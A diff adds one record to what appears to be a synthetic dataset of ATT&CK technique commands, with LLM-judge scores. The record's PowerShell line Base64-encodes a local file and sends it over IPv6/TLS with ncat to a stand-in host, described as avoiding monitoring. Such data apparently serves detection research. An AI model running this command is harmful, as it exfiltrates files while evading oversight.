@@ -1,0 +1,36 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
+  "explanation": "Sends Base64-encoded data over an IPv6 TCP connection with TLS using ncat, leveraging a non-standard high port to avoid common monitoring. This uses a different medium than typical corporate IPv4/HTTP flows, aligning with T1011.",
+  "rationale_steps": [
+    "Convert file to Base64 for opaque transfer.",
+    "Exfiltrate via IPv6 TCP with TLS to a rarely used high port, separating from primary channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-c67318d0",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "PowerShell syntax is correct with balanced quoting and a valid pipeline, though placing --send-only after the host/port may not be accepted by all ncat parsers.",
+        "semantic_score": 2,
+        "semantic_justification": "The command plausibly exfiltrates Base64 data over IPv6/TLS as described, but it does not leverage a signed system script proxy and is misaligned with the provided technique description/ID.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T20:54:35.381329Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
